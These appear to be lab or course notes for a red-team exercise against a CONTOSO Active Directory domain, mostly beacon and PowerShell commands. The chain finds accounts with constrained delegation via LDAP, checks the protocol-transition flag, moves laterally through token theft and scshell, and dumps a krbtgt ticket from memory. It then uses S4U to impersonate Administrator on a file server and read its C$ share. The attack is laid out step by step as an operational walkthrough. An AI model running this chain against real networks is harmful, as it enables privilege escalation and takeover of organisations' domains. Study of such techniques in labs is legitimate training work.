use LDAP to find users with constrained delegation (where the AllowedToDelegateTo attribute is not null)
    ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

we see LON-WS-1$ is AllowedToDelegateTo to cifs (file server) and has a non-default UAC value
check that the TRUSTED_TO_AUTH_FOR_DELEGATION flag is set
    powershell> [Convert]::ToBoolean(16781312 -band 16777216)

we verify that protocol transition is enabled

move laterally to the web server
    steal token from rsteel
    beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
    beacon> jump scshell64 lon-ws-1 smb

now interact with the web server beacon and enumerate the krbtgt ticket for lon-ws-1
    beacon> krb_dump luid:3e7 /service:krbtgt

copy the ticket and store for later
	
    NOTE: store to kirbi file with powershell> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs.kirbi", [Convert]::FromBase64String("[ticket]"))

now perform the attack!
    beacon> krb_s4u /ticket:[stored_tgt] /service:cifs/lon-fs-1 /impersonateuser:Administrator

krb_describe /ticket:[returned ticket]
we can see the service name is cifs/lon-fs-1 with user Administrator!

now we use the ticket to interact with the file server!
    beacon> ls \\lon-fs-1\c$\
        verify we cannot read from it 
    beacon> make_token CONTOSO\Administrator FakePass
    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi
    beacon> ls \\lon-fs-1\c$\
        now we can!